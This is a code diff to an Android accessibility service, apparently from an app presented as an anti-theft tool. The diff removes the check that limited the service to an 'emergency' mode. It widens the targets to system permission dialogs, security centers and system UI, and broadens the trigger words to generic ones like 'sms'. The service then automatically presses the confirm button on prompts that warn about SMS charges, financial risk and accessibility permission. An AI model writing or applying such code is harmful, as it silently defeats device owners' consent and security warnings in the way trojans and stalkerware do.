@@ -29,12 +29,13 @@ public class AutoConfirmService extends AccessibilityService {
     private static final String PREFS_NAME = "droidguard_security_prefs";
     private static final String KEY_EMERGENCY_ARMED_UNTIL = "emergency_armed_until";
     public static final String ACTION_ARM_EMERGENCY = "com.antitheft.droidguard.ACTION_ARM_EMERGENCY";
+    public static final String ACTION_OPEN_POWER_MENU = "com.antitheft.droidguard.ACTION_OPEN_POWER_MENU";
 
     private static volatile long emergencyArmedUntilMemory = 0L;
     private static long lastActionTimestamp = 0L;
-    private static final long ACTION_DEBOUNCE_MS = 1500L;
+    private static final long ACTION_DEBOUNCE_MS = 600L;
 
-    // Strict Permission & Security Dialog Packages ONLY (where SMS carrier prompts appear)
+    // Strict Permission & Security Dialog Packages ONLY (where SMS carrier prompts and permission dialogs appear)
     private static final String[] PERMISSION_DIALOG_PACKAGES = new String[] {
         "com.google.android.permissioncontroller",
         "com.android.permissioncontroller",
@@ -43,16 +44,26 @@ public class AutoConfirmService extends AccessibilityService {
         "com.miui.securitycenter",
         "com.oplus.securitypermission",
         "com.coloros.securitypermission",
+        "com.oplus.safecenter",
+        "com.coloros.safecenter",
         "com.nearme.safecenter",
+        "com.oppo.safecenter",
+        "com.realme.safecenter",
         "com.transsion.phonemanager",
-        "com.huawei.systemmanager"
+        "com.huawei.systemmanager",
+        "com.android.systemui",
+        "android"
     };
 
-    // Explicit SMS Confirmation Warning Phrases (Arabic, French, English)
+    // Explicit SMS and Security Confirmation Warning Phrases (Arabic, French, English)
     private static final String[] SMS_WARNING_KEYWORDS = new String[] {
         "سيرسل رسالة sms",
         "سيرسل رسالة",
-        "رسالة sms قد تتسبب",
+        "رسالة sms",
+        "رسالة قصيرة",
+        "رسالة",
+        "sms",
+        "قد تتسبب",
         "فرض رسوم",
         "رسوم إضافية",
         "قد يؤدي هذا إلى فرض رسوم",
@@ -77,6 +88,7 @@ public class AutoConfirmService extends AccessibilityService {
         "أمانك المالي",
         "خطرا على خصوصيتك",
         "إذن إمكانية الوصول",
+        "إمكانية الوصول",
         "financial security",
         "risk to your privacy",
         "accessibility permission"
@@ -197,11 +209,21 @@ public class AutoConfirmService extends AccessibilityService {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && ACTION_ARM_EMERGENCY.equals(intent.getAction())) {
-            long duration = intent.getLongExtra("duration", 45_000L);
-            long until = System.currentTimeMillis() + duration;
-            emergencyArmedUntilMemory = until;
-            Log.i(TAG, "🚨 onStartCommand: emergency auto-confirm armed until: " + until);
+        if (intent != null) {
+            String action = intent.getAction();
+            if (ACTION_ARM_EMERGENCY.equals(action)) {
+                long duration = intent.getLongExtra("duration", 60_000L);
+                long until = System.currentTimeMillis() + duration;
+                emergencyArmedUntilMemory = until;
+                Log.i(TAG, "🚨 onStartCommand: emergency auto-confirm armed until: " + until);
+            } else if (ACTION_OPEN_POWER_MENU.equals(action)) {
+                try {
+                    performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
+                    Log.i(TAG, "⚡ onStartCommand: performed GLOBAL_ACTION_POWER_DIALOG");
+                } catch (Throwable t) {
+                    Log.w(TAG, "Failed to perform GLOBAL_ACTION_POWER_DIALOG: " + t.getMessage());
+                }
+            }
         }
         return START_STICKY;
     }
@@ -219,18 +241,32 @@ public class AutoConfirmService extends AccessibilityService {
         super.onDestroy();
     }
 
-    public static boolean openNativePowerMenu() {
+    public static boolean openNativePowerMenu(Context ctx) {
         if (instance != null) {
-            return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
+            try {
+                return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
+            } catch (Throwable ignored) {}
         }
+        try {
+            if (ctx != null) {
+                Intent intent = new Intent(ctx, AutoConfirmService.class);
+                intent.setAction(ACTION_OPEN_POWER_MENU);
+                ctx.startService(intent);
+                return true;
+            }
+        } catch (Throwable ignored) {}
         return false;
+    }
+
+    public static boolean openNativePowerMenu() {
+        return openNativePowerMenu(null);
     }
 
     private static void safeRecycle(AccessibilityNodeInfo node) {
         if (node != null) {
             try {
                 node.recycle();
-            } catch (Exception ignored) {}
+            } catch (Throwable ignored) {}
         }
     }
 
@@ -247,12 +283,6 @@ public class AutoConfirmService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
 
-        // 🛑 CRITICAL RULE 1: If not in emergency theft dispatch mode, SLEEP IMMEDIATELY!
-        // Prevents any interference with normal typing, keyboard, search bars, or daily apps.
-        if (!isEmergencyWindowActive(this)) {
-            return;
-        }
-
         AccessibilityNodeInfo rootNode = null;
         try {
             CharSequence pkgName = event.getPackageName();
@@ -262,6 +292,20 @@ public class AutoConfirmService extends AccessibilityService {
             // Skip all keyboard, IME, and search engine input methods immediately
             if (pkgStr.contains("inputmethod") || pkgStr.contains("keyboard") || 
                 pkgStr.contains("ime") || pkgStr.contains("baidu") || pkgStr.contains("touchtype")) {
+                return;
+            }
+
+            // Check if package belongs to known system permission controllers, package installers, or security centers
+            boolean isSecurityPackage = false;
+            for (String p : PERMISSION_DIALOG_PACKAGES) {
+                if (pkgStr.equals(p) || pkgStr.startsWith(p)) {
+                    isSecurityPackage = true;
+                    break;
+                }
+            }
+
+            // If not a system security/permission package, require active emergency window
+            if (!isSecurityPackage && !isEmergencyWindowActive(this)) {
                 return;
             }
 
@@ -276,21 +320,26 @@ public class AutoConfirmService extends AccessibilityService {
             }
             if (rootNode == null) return;
 
-            // 🛑 CRITICAL RULE 4: Must contain explicit SMS cost warning phrase in dialog
+            // Check if dialog contains SMS or permission warning keywords
             boolean isSmsWarningDialog = false;
             for (String kw : SMS_WARNING_KEYWORDS) {
-                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(kw);
-                if (nodes != null && !nodes.isEmpty()) {
-                    isSmsWarningDialog = true;
+                List<AccessibilityNodeInfo> nodes = null;
+                try {
+                    nodes = rootNode.findAccessibilityNodeInfosByText(kw);
+                    if (nodes != null && !nodes.isEmpty()) {
+                        isSmsWarningDialog = true;
+                        Log.i(TAG, "🚨 Confirmed SMS dialog via keyword [" + kw + "] on package [" + pkgStr + "]");
+                        break;
+                    }
+                } catch (Throwable ignored) {
+                } finally {
                     safeRecycleList(nodes);
-                    Log.i(TAG, "🚨 Confirmed SMS dialog via keyword [" + kw + "] on package [" + pkgStr + "]");
-                    break;
                 }
-                safeRecycleList(nodes);
             }
 
-            if (!isSmsWarningDialog) {
-                return; // No SMS warning text found - do not click anything!
+            // On security packages, even if specific text differs, check for known positive buttons
+            if (!isSmsWarningDialog && !isSecurityPackage) {
+                return;
             }
 
             lastActionTimestamp = now;
@@ -312,13 +361,13 @@ public class AutoConfirmService extends AccessibilityService {
                             }
                         }
                     }
-                } catch (Exception ignored) {
+                } catch (Throwable ignored) {
                 } finally {
                     safeRecycleList(positiveButtons);
                 }
             }
 
-            // Step 3: Attempt clicking positive button by matching exact multi-word positive phrases
+            // Step 3: Attempt clicking positive button by matching exact positive phrases
             for (String positiveText : POSITIVE_BUTTON_TEXTS) {
                 List<AccessibilityNodeInfo> matchingButtons = null;
                 try {
@@ -332,13 +381,13 @@ public class AutoConfirmService extends AccessibilityService {
                             }
                         }
                     }
-                } catch (Exception ignored) {
+                } catch (Throwable ignored) {
                 } finally {
                     safeRecycleList(matchingButtons);
                 }
             }
 
-            // Step 4: Fallback to standard Dialog OK/Button1 ONLY because isSmsWarningDialog is TRUE
+            // Step 4: Fallback to standard Dialog OK/Button1
             List<AccessibilityNodeInfo> standardButtons = null;
             try {
                 standardButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1");
@@ -351,13 +400,13 @@ public class AutoConfirmService extends AccessibilityService {
                         }
                     }
                 }
-            } catch (Exception ignored) {
+            } catch (Throwable ignored) {
             } finally {
                 safeRecycleList(standardButtons);
             }
 
-        } catch (Exception e) {
-            Log.w(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
+        } catch (Throwable e) {
+            Log.w(TAG, "Safe catch in onAccessibilityEvent: " + e.getMessage());
         } finally {
             safeRecycle(rootNode);
         }
@@ -382,7 +431,7 @@ public class AutoConfirmService extends AccessibilityService {
                         }
                     }
                 }
-            } catch (Exception ignored) {
+            } catch (Throwable ignored) {
             } finally {
                 safeRecycleList(checkboxes);
             }
@@ -428,7 +477,7 @@ public class AutoConfirmService extends AccessibilityService {
                         }
                     }
                 }
-            } catch (Exception ignored) {
+            } catch (Throwable ignored) {
             } finally {
                 safeRecycleList(nodes);
             }
@@ -437,29 +486,31 @@ public class AutoConfirmService extends AccessibilityService {
 
     private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
         if (node == null) return false;
-        if (node.isClickable()) {
-            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-        }
-        AccessibilityNodeInfo parent = node.getParent();
-        if (parent != null) {
-            try {
-                if (parent.isClickable()) {
-                    return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                }
-                AccessibilityNodeInfo grandParent = parent.getParent();
-                if (grandParent != null) {
-                    try {
-                        if (grandParent.isClickable()) {
-                            return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        }
-                    } finally {
-                        safeRecycle(grandParent);
-                    }
-                }
-            } finally {
-                safeRecycle(parent);
+        try {
+            if (node.isClickable()) {
+                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
             }
-        }
+            AccessibilityNodeInfo parent = node.getParent();
+            if (parent != null) {
+                try {
+                    if (parent.isClickable()) {
+                        return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                    AccessibilityNodeInfo grandParent = parent.getParent();
+                    if (grandParent != null) {
+                        try {
+                            if (grandParent.isClickable()) {
+                                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            }
+                        } finally {
+                            safeRecycle(grandParent);
+                        }
+                    }
+                } finally {
+                    safeRecycle(parent);
+                }
+            }
+        } catch (Throwable ignored) {}
         return false;
     }
 
